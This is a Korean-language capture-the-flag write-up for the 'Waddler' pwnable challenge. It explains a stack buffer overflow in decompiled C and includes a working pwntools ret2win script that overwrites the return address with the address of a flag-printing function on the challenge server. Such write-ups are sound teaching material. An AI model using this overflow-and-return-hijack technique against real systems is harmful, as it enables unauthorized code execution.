## Explain
```c
int duck()
{
  char s[256]; // [rsp+0h] [rbp-110h] BYREF
  size_t v2; // [rsp+100h] [rbp-10h]
  FILE *stream; // [rsp+108h] [rbp-8h]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("flag file not found");
    exit(1);
  }
  if ( !fgets(s, 256, stream) )
  {
    puts("failed to read flag");
    fclose(stream);
    exit(1);
  }
  fclose(stream);
  v2 = strlen(s);
  if ( v2 && s[v2 - 1] == 10 )
    s[v2 - 1] = 0;
  return printf("FLAG: %s\n", s);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("The Ducks are coming!");
  fgets(s, 80, stdin);
  return 0;
}
```
핵심 포인트를 확인해보자.
`main`에서 `char s[64]`에 `fgets(s, 80, stdin)`으로 최대 79바이트를 읽어 스택 버퍼 오버플로우가 발생한다는 점이다. 오버플로우로 저장된 RBP(8바이트)와 RIP를 덮을 수 있어 리턴 주소를 `duck`로 바꾸면 `FLAG: ...`가 출력된다.


```yaml
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled

```
 PIE 비활성화다. 따라서 바이너리 로드 베이스는 고정이고, `duck`의 절대 주소를 그대로 사용할 수 있다. 스크립트를 실행했을 때 나왔던 duck 주소는 duck addr: 0x40128c이였다.


## Exploit

1. `fgets`가 버퍼 크기보다 큰 길이를 읽기 때문에 스택 오버플로우가 발생한다.
2. 버퍼 64바이트 + saved RBP 8바이트 = 72바이트 패딩 후 RIP를 덮는다.
3. `duck()`은 `flag.txt`를 읽어 `FLAG: %s`로 출력하므로 리턴 주소를 `duck`로 바꾼다.
4. PIE 비활성이므로 정적 심볼 주소 사용이 가능하다. 내 출력 기준 `duck = 0x40128c`다.
5. `payload = b"A"*72 + p64(0x40128c)`다.
6. 원격 서비스 배너 `The Ducks are coming!` 수신 후 페이로드를 보낸다. 성공하면 플래가 나온다.
```python
from pwn import *

host = "chall.v1t.site"
port = 30210
p = remote(host, port)

duck_addr = 0x40128c
payload = b"A" * 72 + p64(duck_addr)

p.recvuntil("The Ducks are coming!")
p.sendline(payload)
print(p.recvuntil(b"FLAG: ", timeout=5).decode(errors="ignore"))
print(p.recvline(timeout=5).decode(errors="ignore"))
p.close()
```



## Solved
![](pwnable/Waddler/image1.png)
포너블이 전체적으로 좀 쉽게 출제됐다.